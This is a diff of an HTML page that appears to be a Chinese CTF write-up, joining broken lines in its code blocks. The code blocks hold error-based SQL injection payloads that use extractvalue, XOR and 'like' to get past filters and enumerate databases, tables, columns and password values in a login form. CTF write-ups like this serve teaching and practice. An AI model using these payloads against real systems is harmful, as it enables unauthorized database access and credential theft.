@@ -179,15 +179,10 @@
 <pre><code>username=44&amp;password=1&#39;or(extractvalue(1,concat(&#39;~&#39;,(select(database())))))%23</code></pre><p>也有大佬用^来连接函数，形成异或</p>
 <pre><code>username=44&amp;password=1&#39;^extractvalue(1,concat(&#39;~&#39;,(select(database()))))%23</code></pre><p>得到geek数据库</p>
 <p>再来报表名，因为=不能用这里用like绕过</p>
-<pre><code>username=44&amp;password=1&#39;^extractvalue(1,concat(0x7e,
-(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&#39;g
-eek&#39;)))))%23</code></pre><p>得到H4rDsq1这个表</p>
+<pre><code>username=44&amp;password=1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&#39;geek&#39;)))))%23</code></pre><p>得到H4rDsq1这个表</p>
 <p>查列</p>
-<pre><code>username=44&amp;password=1&#39;^extractvalue(1,concat(0x7e,
-(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H
-4rDsq1&#39;)))))%23</code></pre><p>查password</p>
-<pre><code>username=44&amp;password=1&#39;^extractvalue(1,concat(0x7e,
-(select(password)from(geek.H4rDsq1))))%23</code></pre><p>只出来一部分，因为extractvalue和updatexml()都有最长32的长度限制</p>
+<pre><code>username=44&amp;password=1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;)))))%23</code></pre><p>查password</p>
+<pre><code>username=44&amp;password=1&#39;^extractvalue(1,concat(0x7e,(select(password)from(geek.H4rDsq1))))%23</code></pre><p>只出来一部分，因为extractvalue和updatexml()都有最长32的长度限制</p>
 <blockquote>
 <p>这时候就要想到mysql的一些函数，substr，left，right</p>
 <ul>
@@ -197,8 +192,7 @@ eek&#39;)))))%23</code></pre><p>得到H4rDsq1这个表</p>
 </ul>
 <p>注意：substr被过滤了</p>
 </blockquote>
-<pre><code>username=44&amp;password=1%27^extractvalue(1,concat(0x7e,
-(select(right(password,30))from(geek.H4rDsq1))))%23</code></pre><p>都得到拼一下就得到flag了。</p>
+<pre><code>username=44&amp;password=1%27^extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))%23</code></pre><p>都得到拼一下就得到flag了。</p>
 
             </div>
 
